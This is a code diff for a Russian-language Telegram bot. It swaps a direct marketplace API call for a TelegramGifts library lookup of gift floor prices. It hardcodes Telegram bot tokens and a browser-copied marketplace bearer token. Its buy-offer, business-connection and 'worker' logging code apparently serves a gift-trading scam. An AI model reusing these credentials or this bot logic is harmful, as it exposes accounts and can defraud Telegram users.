@@ -2,7 +2,6 @@ import asyncio
 import json
 import os
 import re
-import aiohttp  # 👈 Прямой запрос без библиотек
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, LinkPreviewOptions
 from aiogram.utils.keyboard import InlineKeyboardBuilder
@@ -11,15 +10,21 @@ from aiogram.client.telegram import TelegramAPIServer
 from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
 from aiogram.types import UniqueGiftInfo
 
+# ─── ИМПОРТ TGMREKTS ───
+try:
+    from TelegramGifts import TelegramGifts
+    gifts_db = TelegramGifts(cache_mode="http", asset_mode="lazy")
+    GIFTS_ENABLED = True
+except Exception as e:
+    print(f"⚠️ Ошибка импорта TelegramGifts: {type(e).__name__}: {e}")
+    GIFTS_ENABLED = False
+
 # ─── НАСТРОЙКИ ───
-BOT_TOKEN = "8588452412:AAFri3a-gzv-iJlVKXyRqWKJMrcavclmvjU"
+BOT_TOKEN = "8820455974:AAH0utZTfOwRXkitjObqRtlUJ8sqEfZdwcY"
 OWNER_ID = 8145037447
 
 REPORT_GROUP_ID = -1004252297326  
 REPORT_TOPIC_ID = 138             
-
-# 👇 ВСТАВЬТЕ СЮДА ВАШ ТОКЕН ИЗ БРАУЗЕРА (он живет ~24 часа)
-MRKT_TOKEN = "16dda374-1f2f-4e00-93f8-fb3feb501369" 
 
 WHITELIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitelist.json")
 DEFAULT_WHITELIST = {8145037447, 8875237733}
@@ -159,34 +164,20 @@ async def send_with_retry(chat_id, text, business_connection_id, reply_markup=No
             print(f"❌ send error: {type(e).__name__}: {e}")
             return None
 
-# 👇 ПРЯМОЙ ЗАПРОС К API MRKT С ТОКЕНОМ
 async def get_mrkt_floor_price(gift_name: str):
-    if not MRKT_TOKEN:
+    if not GIFTS_ENABLED:
         return None
         
     collection_name = gift_name.split('#')[0].strip()
-    url = f"https://api.tgmrkt.io/api/v1/collections/{collection_name}"
-    
-    headers = {
-        "Authorization": f"Bearer {MRKT_TOKEN}",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    }
-
     try:
-        async with aiohttp.ClientSession() as client:
-            async with client.get(url, headers=headers) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    if isinstance(data, dict):
-                        if "floor_price" in data:
-                            return float(data["floor_price"])
-                        if "data" in data and "floor_price" in data["data"]:
-                            return float(data["data"]["floor_price"])
-                else:
-                    print(f"⚠️ MRKT API вернул статус {response.status}: {await response.text()}")
-                return None
+        info = gifts_db.get_gift(collection_name)
+        if info and "prices" in info:
+            price = info["prices"].get("tgmrkt_price_ton")
+            if price:
+                return float(price)
+        return None
     except Exception as e:
-        print(f"⚠️ Ошибка запроса к MRKT: {type(e).__name__}: {e}")
+        print(f"⚠️ Ошибка TelegramGifts: {type(e).__name__}: {e}")
         return None
 
 # ═══════════════════════════════════════════════════════════
@@ -266,10 +257,10 @@ async def handle_buy(message: Message):
 
     gift_name = parse_gift_name(link)
     
-    print(f"🔄 Запрашиваю цену MRKT для {gift_name}...")
+    print(f"🔄 Запрашиваю цену через TelegramGifts для {gift_name}...")
     market_price = await get_mrkt_floor_price(gift_name)
     if market_price:
-        print(f"📊 MRKT цена: {market_price} TON")
+        print(f"📊 Цена: {market_price} TON")
 
     currency_label = PRICE_LABELS.get(lang, PRICE_LABELS["ru"])[currency]
     price_label = f"{price} {currency_label}"
@@ -299,7 +290,6 @@ async def handle_buy(message: Message):
             "price": price, "market_price": market_price, "currency": currency, "link": link,
         }
         print(f"✅ Отправлено ({lang}). Воркер сохранён: {message.from_user.id}")
-
 @dp.callback_query(F.data == "accept_offer")
 async def handle_accept(callback: CallbackQuery):
     msg_id = callback.message.message_id
@@ -401,7 +391,7 @@ async def handle_gift_transfer(message: Message):
 async def main():
     me = await bot.get_me()
     print(f"✅ Бот: @{me.username}")
-    print(f"📊 Прямой токен MRKT установлен")
+    print(f"📊 TelegramGifts: {'Включен' if GIFTS_ENABLED else 'Выключен'}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
